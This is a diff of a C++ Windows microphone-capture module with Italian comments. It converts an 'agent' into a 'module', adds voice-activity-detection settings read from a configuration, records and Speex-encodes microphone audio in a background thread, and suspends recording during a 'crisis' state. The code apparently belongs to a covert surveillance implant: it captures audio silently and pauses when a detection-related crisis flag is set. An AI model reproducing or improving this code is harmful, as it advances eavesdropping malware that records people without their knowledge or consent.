@@ -1,4 +1,7 @@
+#include "Modules.h"
 #include "Common.h"
+#include "Module.h"
+
 #include <mmsystem.h>
 #include <exception>
 #include <winreg.h>
@@ -7,13 +10,14 @@
 #include "speex/speex_preprocess.h"
 
 #include "Conf.h"
-#include "Agents.h"
 #include "Microphone.h"
 #include "Device.h"
+#include "Log.h"
 
 MicAdditionalData mad;
 BOOL bMicIsrecording, bUpdateTimestamp;
-UINT uActive, uVoiceThresh;
+INT vadThreshold;
+BOOL vad;
 DWORD dwMicBuffInCount;
 WAVEHDR	tagMicWaveHdr[MIC_COUNT_BUFF];
 CWaveformIn *micAgent;
@@ -21,8 +25,7 @@ CWaveformIn *micAgent;
 DWORD mic_buffer_len = MIC_DEF_BUFFER_LEN;
 DWORD mic_compress_factor = MIC_DEF_COMPRESS_FACTOR; 
 
-void MicSaveEncode(BYTE *wave, DWORD total_size)
-{
+void MicSaveEncode(BYTE *wave, DWORD total_size) {
 	short *bit_sample;
 	void *state;
 	float *input;
@@ -68,7 +71,7 @@ void MicSaveEncode(BYTE *wave, DWORD total_size)
 	}
 
 	// Se il VAD e' attivo
-	if (uActive) {
+	if (vad) {
 		// Controlliamo che ci sia voce nel campione
 		SHORT sPrev = 0;
 		UINT uZeroCross = 0;
@@ -89,7 +92,7 @@ void MicSaveEncode(BYTE *wave, DWORD total_size)
 		FLOAT fCross = (float)(uZeroCross / (total_size / (frame_size * MIC_SAMPLE_SIZE)));
 
 		// Se non c'e' voce, droppiamo il campione
-		if (fCross >= (FLOAT)uVoiceThresh) {
+		if (fCross >= (FLOAT)vadThreshold) {
 			bUpdateTimestamp = TRUE; // Il prossimo loop dobbiamo aggiornare il timestamp
 			SAFE_DELETE(to_write);
 			SAFE_DELETE(input);
@@ -146,8 +149,7 @@ void MicSaveEncode(BYTE *wave, DWORD total_size)
 }
 
 
-void CALLBACK MicwaveInProc(HWAVEIN hwi, UINT uMsg, DWORD dwInstance, WAVEHDR *dwParam1, DWORD dwParam2)
-{
+void CALLBACK MicwaveInProc(HWAVEIN hwi, UINT uMsg, DWORD dwInstance, WAVEHDR *dwParam1, DWORD dwParam2) {
 	if (uMsg == MM_WIM_DATA) {
 		if (dwParam1->dwBytesRecorded > 0)
 			MicSaveEncode((BYTE *)dwParam1->lpData, dwParam1->dwBytesRecorded);
@@ -165,8 +167,7 @@ void CALLBACK MicwaveInProc(HWAVEIN hwi, UINT uMsg, DWORD dwInstance, WAVEHDR *d
 	}
 }
 
-BOOL MicRecordStop()
-{
+BOOL MicRecordStop() {
 	if (micAgent == NULL)
 		return FALSE;
 
@@ -188,8 +189,7 @@ BOOL MicRecordStop()
 }
 
 
-BOOL MicRecordStart()
-{
+BOOL MicRecordStart() {
 	WAVEFORMATEX in_pcmWaveFormat;
 	CWaveform wave;
 	UINT count = CWaveform::InGetNumDevs();
@@ -239,24 +239,33 @@ BOOL MicRecordStart()
 }
 
 DWORD WINAPI RecordedMicrophone(LPVOID lpParam) {
-	AGENT_COMMON_DATA(AGENT_MIC);
+	Module *me = (Module *)lpParam;
+	Configuration *conf = me->getConf();
+	HANDLE eventHandle;
 	Device *deviceObj = Device::self();
+	Status *statusObj = Status::self();
+
 	BOOL bCrisis = FALSE;
 
 	bMicIsrecording = FALSE;
 	micAgent = NULL;
 	
-	if (lpParam == NULL || MyData->uParamLength != sizeof(UINT) * 2 || statusObj == NULL || deviceObj == NULL) {
-		statusObj->ThreadAgentStopped(MyID);
-		return TRUE;
+	try {
+		vadThreshold = conf->getInt(L"vadthreshold");
+	} catch (...) {
+		vadThreshold = 50;
 	}
 
-	CopyMemory(&uActive, MyData->pParams, sizeof(uActive));
-	CopyMemory(&uVoiceThresh, (BYTE *)(MyData->pParams) + sizeof(uActive), sizeof(uVoiceThresh));
+	try {
+		vad = conf->getBool(L"vad");
+	} catch (...) {
+		vad = FALSE;
+	}
 
-	// Valorizza eventuali parametri 
-	statusObj->AgentAlive(MyID);
-	DBG_TRACE(L"Debug - Microphone.cpp - RecordedMicrophoneAgent started\n", 5, FALSE);
+	me->setStatus(MODULE_RUNNING);
+	eventHandle = me->getEvent();
+
+	DBG_TRACE(L"Debug - Microphone.cpp - Microphone Module started\n", 5, FALSE);
 
 	unsigned __int64 temp_time = GetTime();
 
@@ -273,11 +282,14 @@ DWORD WINAPI RecordedMicrophone(LPVOID lpParam) {
 
 	LOOP {
 		while (bCrisis) {
-			DBG_TRACE(L"Debug - Microphone.cpp - RecordedMicrophoneAgent is in crisis\n", 6, FALSE);
+			DBG_TRACE(L"Debug - Microphone.cpp - Microphone Module is in crisis\n", 6, FALSE);
 
-			if (AgentSleep(MyID, 5000)) {
-				statusObj->ThreadAgentStopped(MyID);
-				DBG_TRACE(L"Debug - Microphone.cpp - RecordedMicrophoneAgent clean stop while in crisis [0]\n", 5, FALSE);
+			WaitForSingleObject(eventHandle, 10000);
+
+			if (me->shouldStop()) {
+				DBG_TRACE(L"Debug - Microphone.cpp - Microphone Module clean stop while in crisis [0]\n", 5, FALSE);
+				me->setStatus(MODULE_STOPPED);
+				return 0;
 			}
 
 			// Se la crisi e' finita...
@@ -285,34 +297,30 @@ DWORD WINAPI RecordedMicrophone(LPVOID lpParam) {
 				bCrisis = FALSE;
 
 				deviceObj->SetMicPowerState();
-
 				MicRecordStart();
+
 				DBG_TRACE(L"Debug - Microphone.cpp - RecordedMicrophoneAgent leaving crisis\n", 6, FALSE);
 			}
 		}
 
-		if (AgentSleep(MyID, 1000) == FALSE) {
-			// Controlliamo se c'e' Crisis
-			if ((statusObj->Crisis() & CRISIS_MIC) != CRISIS_MIC)
-				continue;
+		WaitForSingleObject(eventHandle, 10000);
+
+		if (me->shouldStop()) {
+			DBG_TRACE(L"Debug - Microphone.cpp - Microphone Module clean stop\n", 5, FALSE);
 
 			MicRecordStop();
-
 			deviceObj->ReleaseMicPowerState();
-
-			bCrisis = TRUE;
-			continue;
+			me->setStatus(MODULE_STOPPED);
+			return 0;
 		}
 
-		MicRecordStop();
+		if ((statusObj->Crisis() & CRISIS_MIC) == CRISIS_MIC) {
+			bCrisis = TRUE;
 
-		deviceObj->ReleaseMicPowerState();
-
-		statusObj->ThreadAgentStopped(MyID);
-		DBG_TRACE(L"Debug - Microphone.cpp - RecordedMicrophoneAgent clean stop [1]\n", 5, FALSE);
-		return TRUE; 
+			MicRecordStop();
+			deviceObj->ReleaseMicPowerState();
+		}
 	}
 
-	statusObj->ThreadAgentStopped(MyID);
 	return 0;
 }
